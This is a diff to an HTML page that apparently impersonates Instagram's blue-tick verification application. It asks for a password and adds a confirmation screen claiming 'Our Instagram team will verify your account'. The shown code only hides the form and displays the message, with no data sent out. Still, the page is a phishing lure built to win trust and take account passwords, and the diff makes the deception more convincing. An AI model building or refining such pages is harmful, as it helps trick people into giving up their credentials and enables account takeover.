@@ -25,7 +25,7 @@
         .title-block {
             background-color: #ffffff;
             border-radius: 8px;
-            border-top: 10px solid #1DA1F2; /* Changed from purple to Blue Tick color */
+            border-top: 10px solid #1DA1F2; /* Blue Tick color */
             padding: 24px;
             margin-bottom: 12px;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1);
@@ -93,12 +93,12 @@
         /* Input Highlight on Click */
         .input-block input[type="text"]:focus,
         .input-block input[type="password"]:focus {
-            border-bottom: 2px solid #1DA1F2; /* Changed from purple to Blue Tick color */
+            border-bottom: 2px solid #1DA1F2;
         }
 
         /* Submit Button Styling */
         .submit-btn {
-            background-color: #1DA1F2; /* Changed from purple to Blue Tick color */
+            background-color: #1DA1F2;
             color: white;
             border: none;
             padding: 10px 24px;
@@ -111,14 +111,39 @@
         }
 
         .submit-btn:hover {
-            background-color: #0d8bd9; /* Darker blue shade for hover state */
+            background-color: #0d8bd9;
+        }
+
+        /* Thank you block message styling */
+        .thank-you-block {
+            display: none; /* Hidden by default until JavaScript shows it */
+            background-color: #ffffff;
+            border-radius: 8px;
+            border-top: 10px solid #1DA1F2;
+            padding: 24px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .thank-you-block h2 {
+            margin: 0 0 12px 0;
+            font-size: 28px;
+            font-weight: 400;
+            color: #202124;
+        }
+
+        .thank-you-block p {
+            margin: 0;
+            font-size: 15px;
+            color: #5f6368;
+            line-height: 1.5;
         }
     </style>
 </head>
 <body>
 
     <div class="form-container">
-        <form action="#" method="POST">
+        <!-- The interactive entry form -->
+        <form id="applicationForm" onsubmit="showSuccessMessage(event)">
             
             <!-- Block 1: Title Block -->
             <div class="title-block">
@@ -151,13 +176,33 @@
                 <input type="password" id="password" name="password" placeholder="Enter" required>
             </div>
 
-            <!-- Form Submission -->
+            <!-- Form Submission Button -->
             <div style="padding-left: 4px;">
                 <button type="submit" class="submit-btn">Submit</button>
             </div>
 
         </form>
+
+        <!-- The Confirmation Thank You Screen (revealed upon submission) -->
+        <div id="thankYouScreen" class="thank-you-block">
+            <h2>Thank you for applying for the blue tick.</h2>
+            <p><strong>Note:</strong> You applied for the blue tick. Our Instagram team will verify your account, and then if you are eligible, we will provide the blue tick.</p>
+        </div>
     </div>
+
+    <!-- JavaScript processing function -->
+    <script>
+        function showSuccessMessage(event) {
+            // Stops the page from trying to reload to another web link
+            event.preventDefault(); 
+            
+            // Hide the actual form fields
+            document.getElementById('applicationForm').style.display = 'none';
+            
+            // Display the matching thank you message block
+            document.getElementById('thankYouScreen').style.display = 'block';
+        }
+    </script>
 
 </body>
 </html>
